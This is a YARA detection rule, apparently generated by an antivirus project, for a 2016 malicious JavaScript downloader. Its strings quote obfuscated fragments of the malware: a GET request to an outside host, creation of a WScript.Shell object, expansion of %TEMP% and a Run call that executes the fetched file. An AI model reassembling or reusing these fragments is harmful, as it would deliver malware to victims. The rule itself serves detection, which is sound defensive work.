rule sig_20160427_86b251e5d8ae41b563a3a41cffa9a7b4 {
  meta:
    description = "datamaliciousorder - file 20160427_86b251e5d8ae41b563a3a41cffa9a7b4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fc0cb7f8bd09ba416d3b5a15180ea8699396926459fb1bf677e9f06b8bfc8f96"

  strings:
    $s1  = "XwlbcFsjqh[IlzjzVsfbc](\"G\" + \"ET\", \"http://l-dsk.com/k3isfa\", false);" fullword ascii
    $s2  = "function JrovyJxhre() {return EpwjiKyxyh[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"XsirPqL" ascii
    $s3  = "function JrovyJxhre() {return EpwjiKyxyh[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"XsirPqL" ascii
    $s4  = "var EpwjiKyxyh = function ClgfpSwhqg() {return WrxbjEdrze[GajlaHymoe](\"WScript\"+\".Shell\");}(), UvvxkRcdzs = 11;" fullword ascii
    $s5  = "function EurpdVgfee(OxqazVqqjv, DduabDijvh){LwszzNsovz = LwszzNsovz * 1; return OxqazVqqjv - DduabDijvh;};" fullword ascii
    $s6  = "var WrxbjEdrze = this[\"WScript\"];" fullword ascii
    $s7  = "function VzuviXftun(){return SjwiqThxuo + \"\";};" fullword ascii
    $s8  = "if (XwlbcFsjqh[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function TrlhpHbztn() {return ((CtkaiMosxp == true) && (CtkaiMosxp == FunlfEckms)) ? 1 : LwszzNsovz;};" fullword ascii
    $s10 = "function RubokKmfnr(MsbakThtji) {var AsipjJhohf = (1, 2, 3, 4, 5, MsbakThtji); return AsipjJhohf;};" fullword ascii
    $s11 = "CtkaiMosxp = true; " fullword ascii
    $s12 = "function TlkxaWqpkg(){return 23;};" fullword ascii
    $s13 = "FunlfEckms = true; " fullword ascii
    $s14 = "var FunlfEckms = false;" fullword ascii
    $s15 = "function WmgqnNmwkj()" fullword ascii
    $s16 = "function NfvcyVvonr(){return GajlaHymoe;};" fullword ascii
    $s17 = "XzywsBjmht = true;" fullword ascii
    $s18 = "var CtkaiMosxp = false;" fullword ascii
    $s19 = "var XzywsBjmht = false;" fullword ascii
    $s20 = "function ReduqRjkhh(CypwqRftua){EpwjiKyxyh[\"R\"+\"un\"](CypwqRftua, LwszzNsovz, LwszzNsovz);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}